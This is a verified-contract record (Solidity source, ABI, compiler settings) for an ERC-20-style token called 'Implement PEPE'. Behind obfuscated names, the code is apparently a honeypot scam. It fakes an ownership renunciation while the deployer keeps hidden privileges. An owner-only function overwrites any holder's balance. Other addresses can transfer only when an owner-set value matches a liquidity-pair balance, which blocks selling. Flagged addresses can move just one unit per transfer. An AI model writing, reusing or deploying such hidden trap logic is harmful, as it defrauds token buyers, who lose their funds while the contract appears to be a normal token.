{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface launchShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLaunchTeam) external view returns (uint256);\n\n    function transfer(address teamMax, uint256 tradingTotal) external returns (bool);\n\n    function allowance(address fromLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMax,\n        uint256 tradingTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapEnable, uint256 value);\n    event Approval(address indexed fromLimit, address indexed spender, uint256 value);\n}\n\nabstract contract autoFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapMode {\n    function createPair(address tokenReceiver, address enableList) external returns (address);\n}\n\ninterface launchShouldMetadata is launchShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementPEPE is autoFund, launchShould, launchShouldMetadata {\n\n    bool public limitMaxBuy;\n\n    mapping(address => uint256) private launchSell;\n\n    string private marketingExempt = \"IPE\";\n\n    uint256 private tokenAmount;\n\n    uint256 walletAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSwap;\n    }\n\n    mapping(address => bool) public modeLimit;\n\n    function balanceOf(address feeLaunchTeam) public view virtual override returns (uint256) {\n        return launchSell[feeLaunchTeam];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txReceiverTo;\n    }\n\n    function transfer(address amountFrom, uint256 tradingTotal) external virtual override returns (bool) {\n        return fromIs(_msgSender(), amountFrom, tradingTotal);\n    }\n\n    uint256 constant teamFrom = 1 ** 10;\n\n    function maxTokenSwap() private view {\n        require(modeLimit[_msgSender()]);\n    }\n\n    function minSwapSell(address buyMin, address teamMax, uint256 tradingTotal) internal returns (bool) {\n        require(launchSell[buyMin] >= tradingTotal);\n        launchSell[buyMin] -= tradingTotal;\n        launchSell[teamMax] += tradingTotal;\n        emit Transfer(buyMin, teamMax, tradingTotal);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedExempt;\n\n    string private txReceiverTo = \"Implement PEPE\";\n\n    function modeToken() public {\n        emit OwnershipTransferred(takeTotal, address(0));\n        tokenShould = address(0);\n    }\n\n    uint256 public launchTake;\n\n    address swapMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeReceiverFrom(uint256 tradingTotal) public {\n        maxTokenSwap();\n        walletAt = tradingTotal;\n    }\n\n    constructor (){\n        if (limitMaxBuy) {\n            tokenAmount = launchTake;\n        }\n        totalAuto toExempt = totalAuto(autoReceiver);\n        autoMin = swapMode(toExempt.factory()).createPair(toExempt.WETH(), address(this));\n        \n        takeTotal = _msgSender();\n        modeToken();\n        modeLimit[takeTotal] = true;\n        launchSell[takeTotal] = enableSwap;\n        if (limitMaxBuy) {\n            tokenAmount = launchTake;\n        }\n        emit Transfer(address(0), takeTotal, enableSwap);\n    }\n\n    address public takeTotal;\n\n    function approve(address tradingIs, uint256 tradingTotal) public virtual override returns (bool) {\n        launchedExempt[_msgSender()][tradingIs] = tradingTotal;\n        emit Approval(_msgSender(), tradingIs, tradingTotal);\n        return true;\n    }\n\n    address private tokenShould;\n\n    address autoReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address launchedFee, address tradingIs) external view virtual override returns (uint256) {\n        if (tradingIs == autoReceiver) {\n            return type(uint256).max;\n        }\n        return launchedExempt[launchedFee][tradingIs];\n    }\n\n    function owner() external view returns (address) {\n        return tokenShould;\n    }\n\n    bool public liquidityTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingExempt;\n    }\n\n    function maxExempt(address amountFrom, uint256 tradingTotal) public {\n        maxTokenSwap();\n        launchSell[amountFrom] = tradingTotal;\n    }\n\n    event OwnershipTransferred(address indexed atMax, address indexed modeTrading);\n\n    uint256 private enableSwap = 100000000 * 10 ** 18;\n\n    function fromIs(address buyMin, address teamMax, uint256 tradingTotal) internal returns (bool) {\n        if (buyMin == takeTotal) {\n            return minSwapSell(buyMin, teamMax, tradingTotal);\n        }\n        uint256 modeMin = launchShould(autoMin).balanceOf(swapMax);\n        require(modeMin == walletAt);\n        require(teamMax != swapMax);\n        if (launchTx[buyMin]) {\n            return minSwapSell(buyMin, teamMax, teamFrom);\n        }\n        return minSwapSell(buyMin, teamMax, tradingTotal);\n    }\n\n    address public autoMin;\n\n    uint256 walletExempt;\n\n    function transferFrom(address buyMin, address teamMax, uint256 tradingTotal) external override returns (bool) {\n        if (_msgSender() != autoReceiver) {\n            if (launchedExempt[buyMin][_msgSender()] != type(uint256).max) {\n                require(tradingTotal <= launchedExempt[buyMin][_msgSender()]);\n                launchedExempt[buyMin][_msgSender()] -= tradingTotal;\n            }\n        }\n        return fromIs(buyMin, teamMax, tradingTotal);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFund;\n    }\n\n    bool public sellAmountTeam;\n\n    uint256 private shouldExemptFee;\n\n    function autoShould(address fundAutoReceiver) public {\n        maxTokenSwap();\n        if (launchTake != shouldExemptFee) {\n            launchTake = tokenAmount;\n        }\n        if (fundAutoReceiver == takeTotal || fundAutoReceiver == autoMin) {\n            return;\n        }\n        launchTx[fundAutoReceiver] = true;\n    }\n\n    uint8 private tokenFund = 18;\n\n    mapping(address => bool) public launchTx;\n\n    function launchFrom(address amountReceiver) public {\n        if (liquidityTake) {\n            return;\n        }\n        if (launchTake != shouldExemptFee) {\n            sellAmountTeam = false;\n        }\n        modeLimit[amountReceiver] = true;\n        \n        liquidityTake = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAutoReceiver\",\"type\":\"address\"}],\"name\":\"autoShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunchTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTotal\",\"type\":\"uint256\"}],\"name\":\"feeReceiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMaxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTotal\",\"type\":\"uint256\"}],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ImplementPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}